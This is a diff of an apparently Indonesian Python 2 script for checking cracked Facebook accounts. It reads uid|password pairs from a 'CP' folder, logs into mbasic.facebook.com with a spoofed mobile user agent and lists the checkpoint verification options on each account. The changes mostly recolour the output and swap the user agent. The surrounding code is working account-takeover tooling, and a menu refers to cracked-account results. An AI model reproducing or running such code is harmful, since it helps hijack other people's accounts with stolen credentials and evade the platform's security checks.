@@ -146,7 +146,7 @@ mb = "https://mbasi.facebook.com"
 color = lambda col: "\x1b[1;"+str(col)+"m"
 
 def check_in(uid, pw):
-	ua = "Mozilla/5.0 (Linux; Android 11; vivo 1904 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36"
+	ua = "Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36"
 	ses = requests.Session()
 	ses.headers.update({
 	"Host": "mbasic.facebook.com",
@@ -197,45 +197,46 @@ def check_in(uid, pw):
 		}
 		xnxx = par(ses.post(mb+form["action"], data=dataD).text, "html.parser")
 		ngew = [yy.text for yy in xnxx.find_all("option")]
-		print(" [!] tersedia "+str(len(ngew))+" opsi ")
+		print(" \033[1;96m[\033[1;97m!\033[1;96m]\033[1;97m tersedia "+str(len(ngew))+" opsi ")
 		for opt in range(len(ngew)):
 			print" "*3, str(opt+1)+". "+ngew[opt]
 	elif "login_error" in str(run):
 		oh = run.find("div",{"id":"login_error"}).find("div").text
-		print(" [!] "+oh)
+		print(" \033[1;96m[\033[1;97m!\033[1;96m]\033[1;97m "+oh)
 	else:
-		print(" [!] login gagal, silahkan cek kembali id dan password")
+		print(" \033[1;96m[\033[1;97m!\033[1;96m]\033[1;97m login gagal, silahkan cek kembali id dan password")
 
 def buatngecek():
-	print("\x1b[1;97m [*] masukan format CP/namafile")
+	print(" \033[1;96m[\033[1;97m?\033[1;96m]\033[1;97m masukan format CP/namafile")
 	dirs = os.listdir("CP")
 	print("")
 	for file in dirs:
-		print(" [*] "+file)
-	files = raw_input("\n [?] pilih file : ")
+		print(" \033[1;96m[\033[1;97m×\033[1;96m]\033[1;97m "+file)
+	files = raw_input("\n \033[1;96m[\033[1;97m?\033[1;96m]\033[1;96m PILIH FILE \033[1;97m:\033[1;93m ")
 	try:
 		buka_baju = open(files,"r").readlines()
 	except FileNotFoundError:
-		print(" [×] File tidak ada")
+		print(" \033[1;96m[\033[1;97m×\033[1;96m]\033[1;97m File tidak ada")
 		time.sleep(2); main()
-	print(" [+] Total Akun: "+str(len(buka_baju)))
-	print("-"*40)
+	print(" \033[1;96m[\033[1;97m+\033[1;96m]\033[1;96m Total Akun \033[1;97m:\033[1;93m "+str(len(buka_baju)))
+	print("\033[1;96m¤"*48)
 	for memek in buka_baju:
 		kontol = memek.replace("\n","")
 		titid  = kontol.split("|")
-		print(" [*] check: "+kontol)
+		print(" \033[1;96m[\033[1;97m×\033[1;96m]\033[1;97m check: "+kontol)
 		try:
 			check_in(titid[0], titid[1])
 		except requests.exceptions.ConnectionError:
 			continue
-		print("-"*40)
-	print("-"*40)
-	exit(" [✓] selesai")
+		print("\033[1;96m¤"*48)
+	print("\033[1;96m¤"*48)
+	print("")
+	exit(" \33[3;1m\033[1;97mSelesai.....jangan lupa \33[0;1m\033[1;93mCOLMEX's \033[1;97m")
 	
 def cekakun():
-	print'\n [1]. lihat hasil crack OK '
-	print' [2]. lihat hasil crack CP '
-	anjg = raw_input('\n [?] pilih : ')
+	print'\n \033[1;96m[\033[1;97m1\033[1;96m]\033[1;97m lihat hasil crack \033[1;92mOK '
+	print' \033[1;96m[\033[1;97m1\033[1;96m]\033[1;97m lihat hasil crack CP '
+	anjg = raw_input('\n \033[1;96m[\033[1;97m1\033[1;96m] PILIH\033[1;97m : ')
 	if anjg == '':
 		menu()
 	elif anjg == "1":
